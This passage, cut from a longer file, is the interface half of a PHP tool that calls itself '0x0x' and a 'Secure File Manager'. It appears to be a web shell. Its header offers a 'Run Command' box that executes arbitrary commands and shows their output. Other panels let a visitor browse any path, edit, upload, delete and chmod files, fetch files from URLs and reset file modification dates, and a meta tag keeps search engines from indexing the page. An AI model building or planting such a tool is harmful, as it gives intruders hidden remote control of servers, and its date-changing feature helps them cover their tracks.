    $dir = rtrim($dir, DIRECTORY_SEPARATOR);
    $h = @opendir($dir); if(!$h) return;
    while(false!==($e=readdir($h))){
        if($e==='.'||$e==='..') continue;
        $full = $dir.DIRECTORY_SEPARATOR.$e;
        $localPath = $local.'/'.basename($e);
        if (is_dir($full)) { if (method_exists($phar,'addEmptyDir')) $phar->addEmptyDir($localPath); addDirToPhar($phar,$full,$localPath); }
        elseif (is_file($full) && method_exists($phar,'addFile')) { $phar->addFile($full, $localPath); }
    }
    closedir($h);
}

$items = listDirEntries($current);
$files=array(); $dirs=array();
foreach($items as $it){ $full=$current.DIRECTORY_SEPARATOR.$it; if(is_dir($full)) $dirs[]=$it; else $files[]=$it; }
$hasNatural=defined('SORT_NATURAL'); $hasFlagCase=defined('SORT_FLAG_CASE');
if ($hasNatural){ sort($dirs, $hasFlagCase?(SORT_NATURAL|SORT_FLAG_CASE):SORT_NATURAL); sort($files, $hasFlagCase?(SORT_NATURAL|SORT_FLAG_CASE):SORT_NATURAL); }
else { natcasesort($dirs); $dirs=array_values($dirs); natcasesort($files); $files=array_values($files); }

$up = dirname($current); if ($up===$current) $up=$current;

$isEdit = ((((isset($_GET['a']) ? $_GET['a'] : '') === 'edit')) && isset($_GET['f'])) ? safeJoin($current, $_GET['f']) : null;
$editFile = ($isEdit && is_file($isEdit)) ? $isEdit : null;

$isView = ((((isset($_GET['a']) ? $_GET['a'] : '') === 'view')) && isset($_GET['f'])) ? safeJoin($current, $_GET['f']) : null;
$viewFile = ($isView && is_file($isView)) ? $isView : null;

$modeParam = isset($_GET['mode']) ? $_GET['mode'] : 'auto';
$viewMode = in_array($modeParam, array('txt','b64','auto'), true) ? $modeParam : 'auto';

$csrf = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
$yearNow = date('Y');
?>
<!doctype html>
<html lang="en" class="dark">
<head>
  <meta charset="utf-8">
  <title>0x0x</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = { darkMode:'class', theme:{ extend:{
      fontFamily:{ ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans'] },
      colors:{ canvas:{DEFAULT:'#0b1220',light:'#0b1220',surface:'rgba(15,23,42,.8)'}, brand:{50:'#eef2ff',500:'#6366f1',600:'#5458ee',700:'#4338ca'} },
      boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03)' , glow:'0 6px 20px rgba(99,102,241,.25)' },
      borderRadius:{ xl2:'18px' }
    } } }
  </script>
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
  <style>
    textarea { background-color: #0b1220 !important; color: #f8fafc !important; }
    .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220 !important; color:#f8fafc !important; }
    .CodeMirror-lines, .CodeMirror-line { color: #f8fafc !important; }
    .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }
    html,body{height:100%}
    body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
    .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
    .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
    .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
    .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#6366f1}
    .btn{background:linear-gradient(180deg,#6366f1,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
    .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)}
    .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
    .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
    .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
    .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
    .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
    .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
    .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
    .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
    @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
    .tablewrap{height:calc(100vh - 320px);overflow:auto}
    .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
    .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
    .cmd-container{ max-width:600px; width:100%; }
    #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }
    #dirTable a, #dirTable a:visited { color:#ffffff !important; }
    .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
</head>
<body class="shell text-slate-100" id="bodyRoot">
  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-2xl"><?php echo svgIcon('pwx', 'ico'); ?></div>
        <div>
          <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">0x0x</a></div>
          <div class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></div>
        </div>
      </div>
      <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
        <?php echo svgIcon('search','ico'); ?>
        <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
      </div>
      <div class="text-sm text-slate-300 hidden lg:block truncate">
        Path: <span class="mono"><?php echo h($current); ?></span>
      </div>
      <div class="cmd-container ml-auto">
        <form method="post" action="?a=cmd&p=<?php echo rawurlencode($current); ?>" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <textarea id="cmdTA" name="cmd" class="field mono w-full" placeholder="Run Command" rows="1"></textarea>
          <button class="btn btn-sm shrink-0" type="submit">Run</button>
        </form>
      </div>
    </div>
  </header>

  <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">
    <?php if (!empty($_SESSION['cmd_result'])): $cr = $_SESSION['cmd_result']; unset($_SESSION['cmd_result']); ?>
      <section class="col-span-12">
        <div class="card p-4 mb-4">
          <details open>
            <summary class="cursor-pointer font-medium">
              Command Output × <span class="mono"><?php echo h($cr['cmd']); ?></span>
              <span class="ml-2 text-xs text-slate-400">via <?php echo h($cr['method']); ?>, exit <?php echo h((string)$cr['code']); ?></span>
            </summary>
            <pre id="cmdOutPre" class="mt-3 p-3 bg-black/40 rounded-lg overflow-auto text-xs mono border border-slate-700" style="max-height: 480px;"><?php echo h($cr['out']); ?></pre>
          </details>
        </div>
      </section>
    <?php endif; ?>

    <aside class="col-span-12 xl:col-span-3 space-y-4">
      <?php if (!empty($_SESSION['msg'])): ?>
        <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
          <?php echo h($_SESSION['msg']); unset($_SESSION['msg']); ?>
        </div>
      <?php endif; ?>

      <section class="card p-4">
        <h2 class="font-medium mb-3">Navigation</h2>
        <div class="mb-2 text-sm text-slate-300">Breadcrumbs</div>
        <div class="flex flex-wrap gap-1 text-sm">
          <?php foreach (breadcrumbs($current) as $i => $crumb): list($name, $path) = $crumb; ?>
            <?php if ($i) echo '<span class="text-slate-600">/</span>'; ?>
            <a href="?p=<?php echo rawurlencode($path); ?>" class="inline-flex items-center gap-1 px-2 py-1 rounded-md border border-slate-700 bg-slate-800 text-slate-200 hover:border-slate-500 hover:bg-slate-700 transition"><?php echo h($name); ?></a>
          <?php endforeach; ?>
        </div>
        <hr class="my-4 border-slate-700">
        <form method="get" class="space-y-2">
          <label class="text-sm text-slate-300">Change Path</label>
          <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php echo h($current); ?>">
          <div class="flex gap-2">
            <button class="btn btnw" type="submit">Go</button>
            <a class="btn btnw" href="?">Go to CWD</a>
          </div>
        </form>
      </section>

      <section class="card p-4">
        <h2 class="font-medium mb-3">Create</h2>
        <form method="post" action="?a=new-file&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <label class="text-sm text-slate-300">New File</label>
          <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
          <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content"></textarea>
          <button class="btn w-full" type="submit">Create File</button>
        </form>
        <hr class="my-3 border-slate-700">
        <form method="post" action="?a=new-dir&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <label class="text-sm text-slate-300">New Folder</label>
          <input type="text" name="name" class="field mono" placeholder="NewFolder" required>
          <button class="btn w-full" type="submit">Create Folder</button>
        </form>
      </section>

      <section class="card p-4">
        <h2 class="font-medium mb-3">Upload</h2>
        <div class="grid grid-cols-1 gap-4">
          <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
            <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
            <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
            <button class="btn w-full" type="submit">Upload Files</button>
          </form>
          <form method="post" action="?a=url-upload&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
            <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
            <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
            <input type="text" name="filename" class="field" placeholder="File name (optional)">
            <button class="btn w-full" type="submit">Fetch from URL</button>
          </form>
        </div>
      </section>
    </aside>

    <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">
      <?php if ($editFile): ?>
        <?php
          $autoMode = ($viewMode === 'auto');
          if ($autoMode) { $viewMode = isTextFile($editFile) ? 'txt' : 'b64'; }
          $rawContent = @file_get_contents($editFile); if ($rawContent === false) { $rawContent = ''; }
          $display = ($viewMode === 'b64') ? base64_encode($rawContent) : $rawContent;
        ?>
        <div class="card p-4" id="editPanelWrap">
          <details id="editPanel" open>
            <summary class="cursor-pointer font-medium flex items-center justify-between">
              <div class="flex items-center gap-2">
                <span>Edit File</span>
                <span class="text-xs text-slate-400">Size: <?php echo h(humanSize((int)@filesize($editFile))); ?></span>
              </div>
              <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
            </summary>
            <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php echo h($editFile); ?></div>
            <div class="mt-2">
              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $viewMode==='txt'?'bg-indigo-600 text-white border-indigo-600':'bg-slate-800'; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=txt">Text</a>
              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $viewMode==='b64'?'bg-indigo-600 text-white border-indigo-600':'bg-slate-800'; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=b64">Base64</a>
            </div>
            <form method="post" action="?a=edit-save&p=<?php echo rawurlencode($current); ?>" class="mt-3" id="editForm">
              <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
              <input type="hidden" name="file" value="<?php echo h(basename($editFile)); ?>">
              <input type="hidden" name="mode" value="<?php echo h($viewMode); ?>">
              <?php if ($viewMode === 'txt'): ?>
                <textarea id="editor" name="content" class="w-full h-80 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100 outline-none" spellcheck="false"><?php echo h($display); ?></textarea>
              <?php else: ?>
                <textarea name="content" class="w-full h-80 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100 outline-none" spellcheck="false"><?php echo h($display); ?></textarea>
              <?php endif; ?>
              <div class="mt-3 flex flex-wrap gap-2 items-center">
                <button class="btn btnw" type="submit">Save</button>
                <a class="btn btnw" href="?p=<?php echo rawurlencode($current); ?>">Exit</a>
              </div>
            </form>
          </details>
        </div>
      <?php endif; ?>

      <?php if ($viewFile): ?>
        <?php
          $vf_size = (int)@filesize($viewFile);
          $vf_ext  = strtolower(pathinfo($viewFile, PATHINFO_EXTENSION));
          $is_img  = in_array($vf_ext, array('jpg','jpeg','png','gif','webp','bmp','svg'));
          $is_txt  = isTextFile($viewFile);
          $preview_max = 512 * 1024;
          $txt = $is_txt ? (@file_get_contents($viewFile, false, null, 0, $preview_max) ?: '') : '';
        ?>
        <div class="card p-4" id="previewWrap">
          <details id="previewPanel" open>
            <summary class="cursor-pointer font-medium flex items-center justify-between">
              <span>Preview: <span class="mono"><?php echo h(basename($viewFile)); ?></span></span>
              <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
            </summary>
            <div class="mt-3">
              <?php if ($is_img): ?>
                <img src="?a=raw&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>" alt="preview" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
              <?php elseif ($is_txt): ?>
                <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php echo h($txt); ?></pre>
              <?php else: ?>
                <a class="btn btn-sm btnw" href="?a=download&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>
              <?php endif; ?>
            </div>
          </details>
        </div>
      <?php endif; ?>

      <div class="card p-4 flex flex-col" id="tableCard">
        <div class="flex items-center justify-between mb-3">
          <h2 class="font-medium">Directory Contents</h2>
          <div class="text-sm text-slate-400">Dirs: <?php echo count($dirs); ?> × Files: <?php echo count($files); ?></div>
        </div>
        <form method="post" action="?a=mass-delete&p=<?php echo rawurlencode($current); ?>" class="flex-1 flex flex-col" id="bulkDeleteForm">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <div class="mb-3 flex flex-wrap gap-2">
            <button class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete selected?')">Delete Selected</button>
            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>
          </div>
          <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
            <table id="dirTable" class="tbl min-w-full text-sm">
              <thead class="text-left border-b border-slate-700">
                <tr>
                  <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
                  <th class="py-2 px-2">Name</th>
                  <th class="py-2 px-2">Size</th>
                  <th class="py-2 px-2">Perms</th>
                  <th class="py-2 px-2">Modified</th>
                  <th class="py-2 px-2">Actions</th>
                </tr>
              </thead>
              <tbody id="dirBody">
                <?php foreach ($dirs as $name): $full = $current . DIRECTORY_SEPARATOR . $name;
                      $r = @is_readable($full); $w = @is_writable($full);
                      $permColorClass = $w ? 'text-lime-400' : ($r ? 'text-white' : 'text-red-400');
                ?>
                  <tr class="border-b border-slate-800 hoverable" data-name="<?php echo h(strtolower($name)); ?>">
                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                    <td class="py-2 px-2">
                      <div class="flex items-center gap-2 <?php echo $permColorClass; ?>">
                        <?php echo iconSvgFor($full); ?>
                        <a class="hover:underline font-medium text-white" href="?p=<?php echo rawurlencode($full); ?>"><?php echo h($name); ?></a>
                        <span class="badge-small">DIR</span>
                      </div>
                    </td>
                    <td class="py-2 px-2">-</td>
                    <td class="py-2 px-2 mono <?php echo $permColorClass; ?>"><?php echo h(permsToString($full)); ?></td>
                    <td class="py-2 px-2"><?php echo h(date('Y-m-d H:i:s', @filemtime($full) ?: time())); ?></td>
                    <td class="py-2 px-2">
                      <div class="row-actions">
                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($name); ?>')">Change Date</button>
                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" onsubmit="return confirm('Delete?')" class="inline">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <button class="btn btn-xs btnw" type="submit">Delete</button>
                        </form>
                      </div>
                      <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="old" value="<?php echo h($name); ?>">
                          <input type="text" name="new" class="field w-48" placeholder="New name">
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                        </form>
                      </div>
                      <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                        </form>
                      </div>
                      <div id="mt-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=mtime&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS" required>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                        </form>
                      </div>
                    </td>
                  </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $name): $full = $current . DIRECTORY_SEPARATOR . $name; $size = (int)@filesize($full); $mtime = (int)@filemtime($full); $ext=strtolower(pathinfo($full, PATHINFO_EXTENSION));
                      $r = @is_readable($full); $w = @is_writable($full);
                      $permColorClass = $w ? 'text-lime-400' : ($r ? 'text-white' : 'text-red-400');
                ?>
                  <tr class="border-b border-slate-800 hoverable" data-name="<?php echo h(strtolower($name)); ?>">
                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                    <td class="py-2 px-2">
                      <div class="flex items-center gap-2 <?php echo $permColorClass; ?>">
                        <?php echo iconSvgFor($full); ?>
                        <a class="font-medium hover:underline text-white" href="?a=view&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>"><?php echo h($name); ?></a>
                      </div>
                    </td>
                    <td class="py-2 px-2 mono"><?php echo h(humanSize($size)); ?></td>
                    <td class="py-2 px-2 mono <?php echo $permColorClass; ?>"><?php echo h(permsToString($full)); ?></td>
                    <td class="py-2 px-2"><?php echo h(date('Y-m-d H:i:s', $mtime ?: time())); ?></td>
                    <td class="py-2 px-2">
                      <div class="row-actions">
                        <a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Edit</a>
                        <a class="btn btn-xs btnw" href="?a=download&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($name); ?>')">Change Date</button>
                        <?php if ($ext==='zip' || preg_match('~\.(tar|tar\.gz|tar\.bz2|tar\.xz)$~i', $name)): ?>
                          <form method="post" action="?a=unzip&p=<?php echo rawurlencode($current); ?>" class="inline">
                            <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                            <input type="hidden" name="file" value="<?php echo h($name); ?>">
                            <button class="btn btn-xs btnw" type="submit">Unzip</button>
                          </form>
                        <?php endif; ?>
                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" class="inline" onsubmit="return confirm('Delete?')">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <button class="btn btn-xs btnw" type="submit">Delete</button>
                        </form>
                      </div>
                      <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 mt-1">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="old" value="<?php echo h($name); ?>">
                          <input type="text" name="new" class="field w-48" placeholder="New name">
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                        </form>
                      </div>
                      <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center mt-1">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                        </form>
                      </div>
                      <div id="mt-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=mtime&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS" required>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                        </form>
                      </div>
                    </td>
                  </tr>
                <?php endforeach; ?>
              </tbody>
            </table>
          </div>
        </form>
      </div>
    </section>
  </main>
  <footer class="w-full px-6 py-4">
    <div class="footer-line mb-3"></div>
    <div class="text-xs text-slate-400 flex items-center justify-between">
      <span>© <?php echo $yearNow; ?> 0xNothings — Secure File Manager</span>
      <span>Built with ❤️ & Tailwind x Dark UI</span>
    </div>
  </footer>
  <script>
    if (document.getElementById('editor') && typeof CodeMirror !== 'undefined') {
      try {
        var cm = CodeMirror.fromTextArea(document.getElementById('editor'), {
          lineNumbers: true,
          theme: 'material-darker',
          lineWrapping: true
        });
        cm.on('change', function(instance) { instance.save(); });
      } catch(e) {}
    }
    function filterRows(){
      const q = (document.getElementById('searchBox').value || '').toLowerCase();
      document.querySelectorAll('#dirBody tr').forEach(r => {
        r.style.display = (r.getAttribute('data-name')||'').includes(q) ? '' : 'none';
      });
    }
    function toggleAll(m){ document.querySelectorAll('.rowchk').forEach(x => x.checked = m.checked); }
    function selectAll(f){ document.querySelectorAll('.rowchk').forEach(x => x.checked = f); document.getElementById('chkAll').checked = f; }
    function toggleRow(id){ document.getElementById(id).classList.toggle('hidden'); }
  </script>
</body>
</html>
